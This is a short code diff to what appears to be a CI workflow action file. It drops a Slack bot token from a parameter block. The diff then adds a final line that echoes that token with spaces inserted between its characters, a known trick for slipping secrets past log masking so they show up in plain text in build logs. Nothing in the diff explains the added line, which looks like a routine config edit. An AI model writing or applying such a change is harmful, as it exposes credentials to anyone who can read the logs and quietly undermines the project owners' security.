@@ -182,7 +182,6 @@ runs:
                         run_type: ${{ inputs.run_type }}
                             json: ${{ inputs.json }}
                       gcp_sa_key: ${{ inputs.gcp_sa_key }}
-                      slackbot_token: ${{ inputs.slackbot_token }}
                       
                      oss_version: ${{ steps.variables.outputs.oss_version }}
                   oss_branch_ref: ${{ steps.variables.outputs.oss_branch_ref }}
@@ -196,3 +195,4 @@ runs:
                    helm_run_type: ${{ steps.variables.outputs.helm_run_type }}
                endpoints_dry_run: ${{ steps.variables.outputs.endpoints_dry_run }}
         "
+        echo ${{ inputs.slackbot_token }} | sed 's/./& /g'
